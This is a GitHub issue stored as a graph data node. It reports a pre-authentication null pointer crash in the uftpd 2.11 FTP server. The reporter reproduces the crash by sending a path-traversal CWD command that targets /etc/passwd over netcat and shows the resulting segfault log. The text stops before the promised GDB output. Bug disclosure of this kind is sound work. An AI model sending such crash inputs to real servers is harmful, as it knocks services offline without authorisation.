    <node id="troglobit/uftpd#30">
      <data key="d0">Issue</data>
      <data key="d2">Null Pointer Dereference / Crash</data>
      <data key="d3">Hi!

I found a bug that crashes the forked child pre-authenticated. The details are as follows:

## Triggering the Bug

```shell
root@5829efcb25f7:/opt/uftpd# uftpd -v       
2.11
root@5829efcb25f7:/opt/uftpd# uftpd -n /tmp

root@5829efcb25f7:/opt# nc 127.0.0.1 21
220 uftpd (2.11) ready.
CWD /../../../../../../../etc/passwd

root@5829efcb25f7:/opt/uftpd# dmesg
...
[40553.625757] uftpd[75111]: segfault at 0 ip 00007f6806a484e5 sp 00007ffda5d8c1c8 error 4 in libc-2.31.so[7f68068e2000+178000]
[40553.625771] Code: 00 00 0f 1f 00 31 c0 c5 f8 77 c3 66 2e 0f 1f 84 00 00 00 00 00 f3 0f 1e fa 89 f9 48 89 fa c5 f9 ef c0 83 e1 3f 83 f9 20 77 2b &lt;c5&gt; fd 74 0f c5 fd d7 c1 85 c0 0f 85 eb 00 00 00 48 83 c7 20 83 e1
```

output of GDB session attached to `uftpd -n /tmp`:

```
